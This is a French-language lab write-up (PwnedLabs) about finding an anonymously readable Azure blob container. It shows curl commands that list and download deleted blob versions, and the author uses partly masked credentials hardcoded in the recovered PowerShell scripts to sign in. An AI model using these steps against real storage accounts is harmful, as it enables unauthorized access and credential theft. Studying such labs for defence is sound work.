+++
title = "☁️ - Azure Blob Container to Initial Access"
date = "2025-02-11T15:32:11+01:00"
author = "Hadrien C"
tags = ["pwnedlabs", "AAD"]
description = "Exploitation d'un **accès anonyme** sur un **blob de stockage** Azure"
showFullContent = false
readingTime = true
hideComments = false
+++

_N'ayant jamais fait d'Azure dans un contexte offsec, il est possible qu'il y ait des erreurs dans ce writeup, n'hésitez pas à me contacter pour les remonter :)_

_Aucun mot de passe ni flag ne sera publié dans ce writeup_

## Scénario du challenge : 

L'entreprise "Mega Big Tech" utilise une architecture cloud hybride avec un domaine Active Directory sur site et Azure.
En raison de son importance dans la tech, elle craint des cyberattaques et demande une évaluation de la sécurité de son infrastructure, incluant ses services cloud. Une URL trouvée dans une documentation publique doit être analysée.

Globalement, le but ici est de récupérer des informations confidentielles stockées sur un blob Azure.

## 🔍 Enumération

Pwnedlabs nous fourni une URL : "http://dev.megabigtech.com/$web/index.html" 

![website](/azure_blob_container_to_initial_access/website.png)

En regardant les différentes ressources récupérées par l'application web, on remarque que l'application utilise un blob azure pour stocker des ressources (images, fichier javascript, etc...).

Pour rappel voici la liste des services de stockage Azure avec les URLs associés.

| Storage service               | Endpoint                                         |
| :---------------------------- | :----------------------------------------------- |
| Blob Storage                  | https://"storage-account".blob.core.windows.net  |
| Data Lake Storage             | https://"storage-account".dfs.core.windows.net   |
| Static website (Blob Storage) | https://"storage-account".web.core.windows.net   |
| Azure Files                   | https://"storage-account".file.core.windows.net  |
| Queue Storage                 | https://"storage-account".queue.core.windows.net |
| Table Storage                 | https://"storage-account".table.core.windows.net |

En lisant plusieurs documentations, je comprendre que l'URL est donc sous cette forme : 
``https://mbtwebsite.blob.core.windows.net/$web/<fichiers>``

- **Nom du compte de stockage Azure** : `mbtwebsite`
- **Le nom du conteneur qui héberge le site web** : `$web`

### todo : 
- expliquer le principe des versions des fichiers dans azure
- expliquer comment jouer avec les verions des fichiers


Regarder les fichiers supprimés : 

```bash
curl 'https://mbtwebsite.blob.core.windows.net/$web/?restype=container&comp=list&include=versions' -H 'x-ms-version: 2019-12-12' | xmllint --format - > all_version_id.xml
```

Après avoir identifié un fichier zip, on peux le télécharger :

```bash
curl 'https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionid=2024-03-29T20:55:40.8265593Z' -H 'x-ms-version: 2019-12-12' --output scripts-transfer.zip
```

En l'ouvrant, on constate qu'il contient 2 scripts powershell :

```ps1
# Install the required modules if not already installed
# Install-Module -Name Az -Force -Scope CurrentUser
# Install-Module -Name MSAL.PS -Force -Scope CurrentUser

# Import the required modules
Import-Module Az
Import-Module MSAL.PS

# Define your Azure AD credentials
$Username = "marcus@megabigtech.com"
$Password = "Th*************" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)

# Authenticate to Azure AD using the specified credentials
Connect-AzAccount -Credential $Credential

# Define the Microsoft Graph API URL
$GraphApiUrl = "https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName"

# Retrieve the access token for Microsoft Graph
$AccessToken = (Get-AzAccessToken -ResourceType MSGraph).Token

# Create a headers hashtable with the access token
$headers = @{
    "Authorization" = "Bearer $AccessToken"
    "ContentType"   = "application/json"
}

# Retrieve User Information and Last Sign-In Time using Microsoft Graph via PowerShell
$response = Invoke-RestMethod -Uri $GraphApiUrl -Method Get -Headers $headers

# Output the response (formatted as JSON)
$response | ConvertTo-Json
```
et 
```ps1
# Define the target domain and OU
$domain = "megabigtech.local"
$ouName = "Review"

# Set the threshold for stale computer accounts (adjust as needed)
$staleDays = 90  # Computers not modified in the last 90 days will be considered stale

# Hardcoded credentials
$securePassword = ConvertTo-SecureString "Me******" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ("mar*****", $securePassword)

# Get the current date
$currentDate = Get-Date

# Calculate the date threshold for stale accounts
$thresholdDate = $currentDate.AddDays(-$staleDays)

# Disable and move stale computer accounts to the "Review" OU
Get-ADComputer -Filter {(LastLogonTimeStamp -lt $thresholdDate) -and (Enabled -eq $true)} -SearchBase "DC=$domain" -Properties LastLogonTimeStamp -Credential $credential |
  ForEach-Object {
    $computerName = $_.Name
    $computerDistinguishedName = $_.DistinguishedName

    # Disable the computer account
    Disable-ADAccount -Identity $computerDistinguishedName -Credential $credential

    # Move the computer account to the "Review" OU
    Move-ADObject -Identity $computerDistinguishedName -TargetPath "OU=$ouName,DC=$domain" -Credential $credential
    
    Write-Host "Disabled and moved computer account: $computerName"
  }
```

Avec les différentes informations de récupérées, nous pouvons nous connecter au portail Azure afin de s'authentifier.

<Fin du challenge>